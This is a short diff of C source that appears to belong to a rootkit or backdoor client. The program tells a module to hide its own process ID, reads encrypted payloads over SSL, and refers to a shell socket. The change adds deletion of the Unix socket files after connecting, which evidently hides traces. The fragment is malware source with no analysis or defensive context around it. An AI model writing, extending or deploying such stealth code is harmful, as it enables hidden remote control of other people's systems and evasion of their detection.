@@ -412,6 +412,11 @@ int main(int argc, char** argv) {
         sprintf((char*) buffer, "hide %d", getpid());
         printf("Writing %s to module on process start\n", buffer);
         write(conn_sock, buffer, strlen((char*) buffer));
+
+        //See if I can remove unix socket files after connection
+        unlink(UNIX_SOCK_PATH);
+        unlink(SHELL_SOCK_PATH);
+
         //Read
         for (;;) {
             int size = SSL_read(ssl, buffer, MAX_PAYLOAD);
